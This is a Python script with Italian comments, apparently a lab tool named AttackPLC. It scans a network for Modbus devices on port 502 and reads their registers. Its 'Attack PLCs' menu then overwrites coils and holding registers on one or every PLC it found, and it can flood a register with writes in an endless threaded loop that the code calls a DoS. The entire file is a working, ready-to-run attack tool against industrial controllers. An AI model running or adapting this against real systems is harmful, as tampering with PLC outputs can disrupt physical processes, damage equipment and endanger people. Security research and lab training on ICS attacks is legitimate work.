import os
import time  # Per la sleep
import datetime  # Per il timestamp dei file JSON (per uso futuro)
import nmap3  # Per lo scan della rete
import json  # Per gestire i file json
import threading  # Per fare poi il loop dell'attacco
from collections import defaultdict
from easymodbus.modbusClient import ModbusClient


class AttackPLC:
    """
    Inizializzo la classe
    """

    def __init__(self):
        self.plc_list = {}
        self.plc_registers = defaultdict(dict)
        self.single_plc_registers = defaultdict(dict)

        self.disInReg = {}
        self.InReg = {}
        self.HolReg = {}
        self.Coils = {}

    """
    Giusto per dare un tocco di colore. Definisco una classe con i vari colori da applicare alle print() 
    in caso di necessità. In questo modo rendo meno pesante la lettura dell'output...
    """
    class bcolors:
        OKYELLOW = '\033[33m'
        HEADER = '\033[35m'
        OKBLACK = '\033[30m'
        OKBLUE = '\033[34m'
        OKCYAN = '\033[36m'
        OKGREEN = '\033[32m'
        OKGREY = '\033[93m'
        OKRED = '\033[31m'
        BGGREEN = '\033[42m'
        BGYELLOW = '\033[43m'
        BGCYAN = '\033[46m'
        BGRED = '\033[41m'
        BGBLUE = '\033[44m'
        ENDC = '\033[0m'
        BOLD = '\033[1m'
        UNDERLINE = '\033[4m'

    """
    [Metodo interno] Verifico se già esiste una scansione precedente. Se non esiste,
    chiedo all'utente di effettuarne una
    """
    def scan_is_present(self):
        if not os.path.exists('plc_list.json'):
            req = input("PLC list not present. Perform a new search? [y/n] ")

            if req == "y" or req == "Y":
                self.find_plcs()
            else:
                return

    """
    Eseguo lo scan della rete con nmap filtrando la porta
    502, così da trovare le PLC attive. 
    Il modulo nmap3 restituisce nativamente in output input
    in formato JSON, e di quello verrà poi fatto una specie
    di parsing per trovare gli host che presentano la porta
    502 aperta (e che indicano appunto le PLC). Il risultato
    dell'intera scansione della rete e la lista delle PLC
    trovate vengono salvate su file .json: il primo è per
    mera referenza, il secondo servirà per i metodi di
    questo script
    """
    def find_plcs(self):
        # Chiedo all'utente quale rete vuole scansionare
        net = input("Network to scan (CIDR format): ")

        # Eseguo lo scan sulla rete specificata
        print(f"Scanning {net}\n")
        nmap = nmap3.NmapScanTechniques()
        results = nmap.nmap_tcp_scan(net, args='-p 502')

        # Salvo il risultato dello scan su file JSON
        with open('network_scan.json', 'w') as f:
            f.write(json.dumps(results, indent=4, sort_keys=True))

        print("Active PLCs found: ")

        # Questo serve esclusivamente come chiave
        # per il dict che andrò a creare. Posso farlo
        # partire anche da 0, è indifferente
        plc_num = 1

        # Elimino gli ultimi due campi della scansione, che
        # non sono host, ma entry messe da nmap
        for address in results:
            if address == "runtime" or address == "stats":
                continue

            # Per ogni indirizzo ip trovato, verifico se la
            # porta 502 è aperta. Se non lo è, salto al
            # prossimo host
            for port in results[address]['ports']:
                if port['state'] != "open":
                    continue

                # Salvo l'host nel dict e incremento il valore
                # della prossima chiave
                self.plc_list[plc_num] = address
                plc_num = plc_num + 1

                # Stampo l'host a video
                print('- ' + address)

        print("\n")

        # Salvo l'intero dict ottenuto su file .json
        with open('plc_list.json', 'w') as p:
            p.write(json.dumps(self.plc_list, indent=4))

        time.sleep(1)  # Questa non servirebbe, è solo per rallentare un po' il flusso di esecuzione...
        input("Done. Presse Enter to continue: ")

    """
    Chiedo all'utente i registri da scansionare
    """
    def ask_registers(self):
        req_di_registers = input(f"{self.bcolors.OKYELLOW}Discrete Input Registers{self.bcolors.ENDC}. "
                                 f"Enter address separated by comma (0-99): ")
        req_input_registers = input(f"{self.bcolors.OKCYAN}Input Registers{self.bcolors.ENDC}. "
                                    f"Enter address range (0-1023): ")
        req_holding_registers = input(f"{self.bcolors.OKBLUE}Holding Registers{self.bcolors.ENDC}. "
                                      f"Enter address range (0-1023): ")
        req_coils = input(f"{self.bcolors.OKRED}Coils{self.bcolors.ENDC}. Enter addresses separated by comma (0-99): ")

        print("\n")

        return req_di_registers, req_input_registers, req_holding_registers, req_coils

    """
    Leggo i Discrete Input Registers (identificati da %IXa.b).

    Parametri:
    - mb: è il file descriptor della connessione Modbus
    - param_addr: indirizzi passati in input dall'utente nel metodo ask_registers()
    """
    def read_DiscreteInputRegisters(self, mb, param_addr=''):
        # Dictionnary dove andrò a mettere i registri letti e i
        # relativi valori
        registri = {}

        starting_addr = param_addr
        starting_addr = starting_addr.split(',')

        for addr in starting_addr:
            # Converto il valore letto in intero e poi lo trasformo in
            # decimale, così da passarlo al metodo read_discretinputs()
            # (gli indirizzi della PLC sono in base 8, mentre Modbus li
            # vuole in base 10. Si veda per maggiori dettagli
            # https://www.openplcproject.com/reference/modbus-slave/
            # (ma attenzione alla modalità master, che NON ho considerato
            # in questa sede!)
            addr = int(addr)
            addr_dec = addr * 8

            print(f"Reading {self.bcolors.OKYELLOW}Discrete Input Registers{self.bcolors.ENDC} "
                  f"from {self.bcolors.OKYELLOW}%IX{addr}.0{self.bcolors.ENDC} "
                  f"to {self.bcolors.OKYELLOW}%IX{addr}.7{self.bcolors.ENDC}")

            # Leggo 8 registri a partire dall'indirizzo di partenza. Nulla
            # mi vieterebbe di leggerne anche 100, ma manteniamo la
            # suddivisione in base all'indirizzo...)
            discreteIn = mb.read_discreteinputs(addr_dec, 8)

            # Ricavo il dict dall'output della lettura dei
            # registri
            reg_num = 0  # Identificativo del registro

            for di in discreteIn:
                registri['%IX' + str(addr) + '.' + str(reg_num)] = str(di)
                reg_num += 1

        # Ritorno i registri e il loro valore
        return registri

    """
    Leggo gli Input Registers (identificati da %IWa)

    Parametri:
    Vedi metodo read_DiscreteInput()
    """
    def read_InputRegisters(self, mb, param_addr=''):
        registri = {}

        addr_range = param_addr
        starting_addr = int(addr_range.split('-')[0])
        ending_addr = int(addr_range.split('-')[1])

        print(f"Reading {self.bcolors.OKCYAN}Input Registers{self.bcolors.ENDC} " 
              f"from {self.bcolors.OKCYAN}%IW{starting_addr}{self.bcolors.ENDC} "
              f"to {self.bcolors.OKCYAN}%IW{ending_addr}{self.bcolors.ENDC}")
        inputRegisters = mb.read_inputregisters(starting_addr, ending_addr)

        reg_num = starting_addr

        for ir in inputRegisters:
            registri['%IW' + str(reg_num)] = str(ir)
            reg_num += 1

        return registri

    """
    Leggo gli Output e gli Holding Registers
    
    Parametri: vedi metodo read_DiscreteInput()
    """
    def read_HoldingOutputRegisters(self, mb, param_addr=''):
        registri = {}

        addr_range = param_addr
        starting_addr = int(addr_range.split('-')[0])
        ending_addr = int(addr_range.split('-')[1])

        print(f"Reading {self.bcolors.OKBLUE}Holding Registers{self.bcolors.ENDC} "
              f"from {self.bcolors.OKBLUE}%QW{starting_addr}{self.bcolors.ENDC} "
              f"to {self.bcolors.OKBLUE}%QW{ending_addr}{self.bcolors.ENDC}")
        holdingRegisters = mb.read_holdingregisters(starting_addr, ending_addr)

        reg_num = starting_addr

        for hr in holdingRegisters:
            registri['%QW' + str(reg_num)] = str(hr)
            reg_num += 1

        return registri

    """
    Leggo le Coils
    
    Parametri: vedi metodo read_DiscreteInput()
    """
    def read_Coils(self, mb, param_addr=''):
        registri = {}

        starting_addr = param_addr
        starting_addr = starting_addr.split(',')

        for addr in starting_addr:
            addr = int(addr)
            addr_dec = addr * 8

            print(f"Reading {self.bcolors.OKRED}Coils{self.bcolors.ENDC} "
                  f"from {self.bcolors.OKRED}%QX{addr}.0{self.bcolors.ENDC} "
                  f"to {self.bcolors.OKRED}%QX{addr}.7{self.bcolors.ENDC}")
            coils = mb.read_coils(addr_dec, 8)

            reg_num = 0

            for coil in coils:
                registri['%QX' + str(addr) + '.' + str(reg_num)] = str(coil)
                reg_num += 1

        return registri

    """
    Metodo che si connette alla PLC e richiama i quattro metodi precedenti per la lettura dei
    vari registri. Tutto ciò è stato fatto per evitare codice "copia-incolla", ma temo di aver
    inventato il codice "matrioska"...
    
    Parametri:
    - plc: PLC a cui connettersi
    - d_ir: discrete input registers passati in input all'utente e passati a sua volta al relativo metodo di lettura
    - ir: input registers. Vale dil discorso fatto sopra
    - hr: holding registers
    - cl: coils
    """
    def read_registers(self, plc, d_ir, ir, hr, cl):
        print(f'Connecting to {self.bcolors.OKGREY}{plc}{self.bcolors.ENDC}')
        print("\n")

        mb = ModbusClient(plc, 502)
        mb.connect()

        # Leggo i vari registri
        self.disInReg = self.read_DiscreteInputRegisters(mb, d_ir)
        self.InReg = self.read_InputRegisters(mb, ir)
        self.HolReg = self.read_HoldingOutputRegisters(mb, hr)
        self.Coils = self.read_Coils(mb, cl)

        mb.close()

        print("\n")

    """
    Analizzo i registri di ogni PLC trovata in precedenza. E' necessario
    aver effettuato uno scan della rete e aver ottenuto una lista di PLC
    attive prima di procedere oltre: se una scansione precedente non è 
    stata trovata, chiedo all'utente se vuole eseguirne una.
    I risultati dello scan vengono salvati in un file .json
    
    Parametri: 
    - single_plc: se "all", scansiona tutte le PLC presenti nella lista delle PLC attive; se "single", scansiona
    una singola PLC su scelta dell'utente, sempre tra quelle disponibili in elenco
    """
    def scan_plcs(self, single_plc='all'):
        # Se non è presente lo scan delle PLC attive sulla rete, chiedi all'utente di eseguirne uno
        self.scan_is_present()

        # Leggo da file la lista delle PLC trovate in precedenza
        with open('plc_list.json', 'r') as f:
            buf = f.read()

        # Converto l'elenco da JSON a dict
        plc_list = json.loads(buf)

        # Faccio lo scan di tutte le PLC della rete
        if not single_plc == 'single':
            print("Scanning all PLCs\n")

            # Chiedo all'utente i registri da scansionare
            req_di_registers, req_input_registers, req_holding_registers, req_coils = self.ask_registers()

            # Analizzo le PLC una a una
            for plc in plc_list:
                self.read_registers(plc_list[plc], req_di_registers, req_input_registers, req_holding_registers,
                                    req_coils)

                # I dati letti sono salvati dai vari metodi su dei dictionaries separati, dictionaries
                # che poi riunisco in un unico dictionary globale che sarà poi il file .json che andrò a salvare
                self.plc_registers[plc_list[plc]]['DiscreteInputRegisters'] = self.disInReg
                self.plc_registers[plc_list[plc]]['InputRegisters'] = self.InReg
                self.plc_registers[plc_list[plc]]['HoldingOutputRegisters'] = self.HolReg
                self.plc_registers[plc_list[plc]]['Coils'] = self.Coils

            # Salvo il risultato della scansione su file
            with open('all_plcs_registers.json', 'w') as pr:
                pr.write(json.dumps(self.plc_registers, indent=4)) # json.dumps() converte il dict in json

        else:
            plc = None

            print("Scanning single PLC\n")
            print("Available PLCs: ")
            count = 1  # Contatore, serve solo per l'elenco delle plc

            # Mostro l'elenco delle PLC disponibili sulla rete
            for i in plc_list:
                print(f'{str(count)} - {plc_list[i]}')
                count += 1

            print("\n")
            choice = input('Choose a PLC: ')

            # Ovviamente la PLC deve essere in elenco...
            for key in plc_list:
                if choice == key:
                    plc = plc_list[key]
                    break

                else:
                    print("Invalid choice")

            print("\n")

            # Come sopra, chiedo all'utente i registri da leggere
            req_di_registers, req_input_registers, req_holding_registers, req_coils = self.ask_registers()

            # Mi connetto alla PLC
            self.read_registers(plc, req_di_registers, req_input_registers, req_holding_registers, req_coils)

            # Anche qui, come sopra, salvo i valori letti nei dict separati in un dict globale
            self.single_plc_registers[plc]['DiscreteInputRegisters'] = self.disInReg
            self.single_plc_registers[plc]['InputRegisters'] = self.InReg
            self.single_plc_registers[plc]['HoldingOutputRegisters'] = self.HolReg
            self.single_plc_registers[plc]['Coils'] = self.Coils

            with open(f'{plc}.json', 'w') as sp:
                sp.write(json.dumps(self.single_plc_registers, indent=4))

        # Ritorno al menu principale
        time.sleep(1)  # Nemmeno questaservirebbe, è sempre per rallentare il flusso di esecuzione...
        input("Done. Press Enter to continue ")

    """
    Seleziono il registro su cui effettuare l'attacco. Viene inoltre chiesto di inserire il nuovo valore che si
    andrà a scrivere sul suddetto registro.
    Il metodo ritorna il tipo di registro ("coil" o "register", l'indirizzo Modbus del registro e il valore da
    scrivere
    """
    def select_register(self):
        reg_type = None
        modbus_addr = None
        value = None

        choice = input("Select register: ")

        # Distinguo il tipo di registro in base alle sue caratteristiche: se è un registro binario
        # (%QX) allora il tipo di registro sarà una coil; se invece è un word register (o come si chiama %QW)
        # allora il tipo di regisstro è un holding/output register
        if choice[2] == "X" or choice[2] == "x":
            reg_type = "coil"

            # Prendo la parte dell'address e la trasformo da ottale a decimale
            ind = choice.split(choice[2])[1]
            addr = int(ind.split('.')[0]) * 8
            register = int(ind.split('.')[1])

            # Per ottenere il modbus address della coil, sommo l'address decimale e il numero della coil
            # (es: %QX99.1 => 99*8 + 1 = 793)
            modbus_addr = addr + register

            value = input("Enter new value [True/False]: ")

        elif choice[2] == "W" or choice[2] == "w":
            reg_type = "register"

            # Per gli holding registers, invece, siamo già a posto così e non serve la
            # conversione in decimale
            modbus_addr = int(choice.split(choice[2])[1])
            value = input("Enter new value: ")

        return reg_type, modbus_addr, value

    """
    Metodo che effettua l'attacco DoS su un registro. Dato che l'attacco DoS va in un thread, devo
    per forza gestirlo come metodo separato, altrimenti mi si blocca l'esecuzione del resto del programma.
    
    Parametri;
    - plc: PLC da attaccare
    - reg_type: tipo di registro (holding/coil)
    - modbus_addr: indirizzo su cui effettuare il DoS
    - value: valore da scrivere sul regisstro
    """
    def dos_attack(self, plc, reg_type, modbus_addr, value):
        try:
            mb = ModbusClient(plc, 502)
            mb.connect()
        except:
            print(f"Connection to {plc} failed. Exiting")
            return

        if reg_type == "coil":
            # Queste (ri)conversioni dell'indirizzo servono solo per la print!
            addr = modbus_addr / 8
            addr = int(addr)
            register = modbus_addr % 8

            print(f"DoS attack on {self.bcolors.OKRED}%QX{addr}.{register}{self.bcolors.ENDC}")

            while True:
                mb.write_single_coil(int(modbus_addr), bool(value))

        elif reg_type == "register":
            print(f"DoS attack on {self.bcolors.OKBLUE}%QW{modbus_addr}{self.bcolors.ENDC}")

            while True:
                mb.write_single_register(int(modbus_addr), int(value))

        mb.close()

    """
    Esegue l'attacco su un registro singolo.
    
    Parametri: 
    - plc: PLC da attaccare
    - reg_type: tipo di registro da attaccare
    - modbus_addr: indirizzo del registro
    - value: valore da scrivere sul registro
    - loop: indica se l'attacco sul registro è continuo (DoS) o singolo
    """
    def make_attack(self, plc, reg_type, modbus_addr, value, loop):
        if reg_type == 'coil':

            # Se l'utente ha chiesto esplicitamente di eseguire il DoS sul registro, lancia un nuovo thread
            # con l'attacco, altrimenti fai una normale scrittura singola
            if loop == "Y" or loop == "y":
                thr1 = threading.Thread(target=self.dos_attack, args=(plc, reg_type, int(modbus_addr), bool(value)))
                thr1.start()
            else:
                # Ho messo due volte il try-catch invece di una volta sola perchè già self.dos_attack() fa una
                # connessione di suo e non so se aprendo un'altra connessione prima possano esserci problemi.
                # Probabilmente no, ma nel dubbio tengo separati i due casi...
                try:
                    mb = ModbusClient(plc, 502)
                    mb.connect()
                except:
                    print(f"Connection to {plc} failed. Exiting")
                    return

                mb.write_single_coil(modbus_addr, bool(value))

                mb.close()

        elif reg_type == "register":
            if loop == "Y" or loop == "y":
                thr1 = threading.Thread(target=self.dos_attack, args=(plc, reg_type, int(modbus_addr), int(value)))
                thr1.start()
            else:
                # Vedi analogo caso nel primo if
                try:
                    mb = ModbusClient(plc, 502)
                    mb.connect()
                except:
                    print(f"Connection to {plc} failed. Exiting")
                    return

                mb.write_single_register(int(modbus_addr), int(value))

                mb.close()

    """
    Cambio il valore di un registro sulla PLC.
    
    Parametri:
    - single_plc: se 'all', attacca tutte le PLC in lista; se 'single', attacca la singola PLC scelta dall'utente
    """
    def change_register_value(self, single_plc='all'):
        if not single_plc == 'single':
            # Al solito, verifico che prima sia stata scansionata la rete. Se non è stato fatto, chiedi
            # all'utente di rifare lo scan.
            self.scan_is_present()

            # Leggo la lista delle PLC da json e converto il tutto in dict
            with open('all_plcs_registers.json', 'r') as pl:
                plc_list = pl.read()

            plc_list = json.loads(plc_list)

            # Va bene così, perchè devo solo elencare i registri
            # che ho letto prima. Per vedere quali sono, basta prendere
            # la prima PLC in lista, le altre avranno gli stessi registri
            tmp_plc = list(plc_list.keys())[0]
            tmp_plc_data = plc_list[tmp_plc]

            print("Available registers: \n")

            # Scorri i vari registri e mostra quelli disponibili
            for key, val in tmp_plc_data.items():
                if key == "HoldingOutputRegisters":
                    print(key)
                    print("-----------")

                    for key2, val2 in tmp_plc_data[key].items():
                        print(key2)

                if key == "Coils":
                    print("\n" + key)
                    print("-----------")

                    for key2, val2 in tmp_plc_data[key].items():
                        print(key2)

            print("\n")

            # Chiedi all'utente quale registro vuole attaccare e chiedi se vuole effettuare un DoS
            reg_type, modbus_addr, value = self.select_register()

            loop = input("Do you want to perform a DoS on the register? [y/n] ")

            print("\n")

            # Mi connetto a tutte le PLC della lista
            for plc in plc_list:
                print(f"Connecting to {plc}")

                # Porta l'attacco vero e proprio
                self.make_attack(plc, reg_type, modbus_addr, value, loop)

        else:
            plc = None
            self.scan_is_present()

            with open('plc_list.json', 'r') as pl:
                plc_list = pl.read()

            plc_list = json.loads(plc_list)

            # Mostra banalmente l'elenco delle PLC disponibili
            print("Available PLCs: ")
            counter = 1
            for i in plc_list:
                print(f'{counter} - {plc_list[i]}')

            print("\n")
            choice = input("Select PLC: ")

            # Controllo se esiste il file con la scansione della PLC selezionata
            if not os.path.exists(f'{plc_list[str(choice)]}.json'):
                new_scan = input("Scan not found. Perform a new scan for this PLC? [y/n] ")
                if new_scan == 'n' or new_scan == 'N':
                    return
                else:
                    self.scan_plcs('single')

            with open(f'{plc_list[str(choice)]}.json', 'r') as sp:
                plc_data = sp.read()

            plc_data = json.loads(plc_data)

            # Recupero l'indirizzo IP della PLC
            plc = list(plc_data.keys())[0]

            # Recupero le chiavi del registro
            tmp_plc_data = plc_data[plc]

            print("\n")

            # Similmente al caso dell'attacco su tutte le PLC, ma questa volta mostra anche il valore
            # dei registri
            print(f"Available registers and values for {plc}: \n")

            for key, val in tmp_plc_data.items():
                if key == "HoldingOutputRegisters":
                    print(key)
                    print("-----------")

                    for key2, val2 in tmp_plc_data[key].items():
                        print(key2 + ' = ' + val2)

                if key == "Coils":
                    print("\n" + key)
                    print("-----------")

                    for key3, val3 in tmp_plc_data[key].items():
                        print(key3 + ' = ' + val3)

            print("\n")

            reg_type, modbus_addr, value = self.select_register()
            loop = input("Do you want to perform a DoS on the register? [y/n]: ")

            self.make_attack(plc, reg_type, modbus_addr, value, loop)

        time.sleep(1)  # Altrimenti mi sballa la stampa in caso di thread
        print("\n")
        input("Done. Presse Enter to continue: ")


"""
Definisco il main. Che poi è il menu da cui richiamo
le varie funzioni del generatore di attacchi...
"""


def main():
    ap = AttackPLC()

    while True:
        # Pulisco lo schermo, che fa più elegante...
        os.system('clear')

        print(f"{ap.bcolors.BGRED}{ap.bcolors.OKBLACK}==== Attack PLC - Menu ===={ap.bcolors.ENDC}{ap.bcolors.ENDC}")
        print("1 - Find active PLCs")
        print("2 - Scan all PLCs registers")
        print("3 - Scan single PLC registers")
        print("4 - Attack PLCs")
        print("5 - Attack single PLC")
        print("6 - Exit\n")
        choice = input("Enter your choice: ")

        if choice == "1":
            ap.find_plcs()
        elif choice == "2":
            ap.scan_plcs('all')
        elif choice == "3":
            ap.scan_plcs('single')
        elif choice == "4":
            ap.change_register_value('all')
        elif choice == "5":
            ap.change_register_value('single')
        elif choice == "6":
            os._exit(1)
        else:
            print("Invalid choice\n")


if __name__ == '__main__':
    main()
